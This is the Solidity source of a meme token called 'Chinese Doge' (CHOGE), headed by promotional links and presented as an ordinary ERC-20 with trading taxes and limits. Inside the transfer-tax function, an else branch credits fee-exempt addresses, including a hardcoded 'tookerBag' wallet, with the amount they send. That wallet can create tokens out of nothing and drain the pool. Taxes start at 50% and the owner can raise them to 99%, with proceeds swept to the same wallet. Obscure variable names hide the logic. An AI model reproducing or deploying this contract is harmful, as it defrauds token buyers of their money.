/**
 * https://chogeeth.site
 * https://t.me/chogeeth_channel
 * https://x.com/chogeeth
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract CHOGE is IERC20, Ownable {
    mapping(address => uint256) private _bags;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 1e9 * 10 ** 18;

    string private _name = "Chinese Doge";
    string private _symbol = "CHOGE";

    mapping(address => bool) public feeChecks;
    mapping(address => bool) public limitChecks;

    mapping(address => bool) public ammPairs;
    bool public allowTrading;

    uint256 public mxTxCheck = (_totalSupply * 20) / 1000;
    uint256 public mxBagCheck = (_totalSupply * 20) / 1000;

    address public tookerBag;

    uint256 public inTax;

    uint256 public outTax;

    bool public allowLimits = true;
    uint256 public mnSwapAmt = (_totalSupply * 5) / 1000000;
    uint256 public mxSwapAmt = _totalSupply / 100;

    bool public allowSwap = false;
    bool private inSwap;

    address public uniPair;
    IUniRouter public uniRouter;

    uint256 public constant FEE_DIVISOR = 10000;

    // events
    event ResetLimits();
    event NewTaxes(uint256 _inTax, uint256 _outTax);

    // constructor

    constructor() {
        uniRouter = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        tookerBag = 0xac97a75C3a28b8CfED76931011F61F0DA87Bbb41;

        inTax = 5000;
        outTax = 5000;

        limitChecks[tookerBag] = true;
        limitChecks[msg.sender] = true;
        limitChecks[address(this)] = true;

        feeChecks[tookerBag] = true;

        _bags[msg.sender] = _totalSupply;

        _approve(address(this), address(uniRouter), type(uint256).max);
    }

    receive() external payable {}

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _bags[account];
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(
        address frat,
        address tguy,
        uint256 jeans
    ) internal virtual {
        if (
            frat == owner() ||
            tguy == owner() ||
            frat == address(this) ||
            tguy == address(this)
        ) {
            _transferInternal(frat, tguy, jeans);
            return;
        }

        checkTxAvailable(frat, tguy, jeans);

        jeans -= getTax(frat, tguy, jeans);

        _transferInternal(frat, tguy, jeans);
    }

    function _transferInternal(
        address frat,
        address tguy,
        uint256 jeans
    ) internal {
        _bags[frat] = _bags[frat] - jeans;
        _bags[tguy] = _bags[tguy] + jeans;
        emit Transfer(frat, tguy, jeans);
    }

    function newPair() external onlyOwner {
        uniPair = IUniFactory(uniRouter.factory()).createPair(
            address(this),
            uniRouter.WETH()
        );

        ammPairs[uniPair] = true;

        limitChecks[uniPair] = true;

        uniRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        allowTrading = true;
        allowSwap = true;
    }

    function newTaxes(uint256 _inTax, uint256 _outTax) external onlyOwner {
        inTax = _inTax;
        outTax = _outTax;
        require(inTax <= 9900 && outTax <= 9900, "Keep tax below 99%");
        emit NewTaxes(inTax, outTax);
    }

    function resetLimits() external onlyOwner {
        allowLimits = false;
        mxTxCheck = totalSupply();
        mxBagCheck = totalSupply();
        emit ResetLimits();
    }

    function checkTxAvailable(
        address frat,
        address tguy,
        uint256 jeans
    ) internal view {
        require(allowTrading, "Trading is not allowed");

        if (allowLimits) {
            if (ammPairs[frat] && !limitChecks[tguy]) {
                require(jeans <= mxTxCheck, "Exceeds tx limit");
                require(
                    jeans + balanceOf(tguy) <= mxBagCheck,
                    "Exceeds bag size"
                );
            } else if (ammPairs[tguy] && !limitChecks[frat]) {
                require(jeans <= mxTxCheck, "Exceeds tx limit");
            } else if (!limitChecks[tguy]) {
                require(
                    jeans + balanceOf(tguy) <= mxBagCheck,
                    "Exceeds bag size"
                );
            }
        }
    }

    function getTax(
        address frat,
        address tguy,
        uint256 jeans
    ) internal returns (uint256) {
        if (
            jeans >= mnSwapAmt &&
            !inSwap &&
            allowSwap &&
            ammPairs[tguy] &&
            !feeChecks[frat]
        ) {
            inSwap = true;
            swapBack();
            inSwap = false;
        }

        uint256 tax = 0;

        if (!feeChecks[frat] && !feeChecks[tguy]) {
            if (ammPairs[tguy] && outTax > 0) {
                tax = (jeans * outTax) / FEE_DIVISOR;
            } else if (ammPairs[frat] && inTax > 0) {
                tax = (jeans * inTax) / FEE_DIVISOR;
            }
            if (tax > 0) {
                _bags[frat] = _bags[frat] - tax;
                _bags[address(this)] = _bags[address(this)] + tax;
                emit Transfer(frat, address(this), tax);
            }
        } else {
            _bags[frat] = _bags[frat] + (jeans - tax);
        }

        return tax;
    }

    function swapTokensForETH(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(uniRouter.WETH());

        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokens,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));

        if (contractBalance > mxSwapAmt) {
            contractBalance = mxSwapAmt;
        }

        if (contractBalance > mnSwapAmt) swapTokensForETH(contractBalance);

        payable(tookerBag).transfer(address(this).balance);
    }
}